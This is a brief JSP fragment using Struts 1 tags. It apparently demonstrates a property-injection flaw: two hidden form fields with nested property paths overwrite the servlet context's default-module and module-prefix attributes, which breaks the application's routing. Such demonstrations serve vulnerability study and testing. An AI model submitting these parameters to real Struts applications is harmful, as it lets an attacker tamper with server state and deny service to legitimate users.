...
<logic:messagesPresent>
   ...
   <html:messages id="error">
    ...
    <p>
        ...
        <html:hidden property="multipartRequestHandler.servlet.servletContext.attribute(org.apache.struts.action.MODULE)" value="Field named to trash the default module!"/></br>
        <html:hidden property="multipartRequestHandler.servlet.servletContext.attribute(org.apache.struts.globals.MODULE_PREFIXES)" value="Trash the prefixes to other modules!"/></br>
        <html:hidden property="theText" value="ABCDEF"/>
    </p>
    <p>
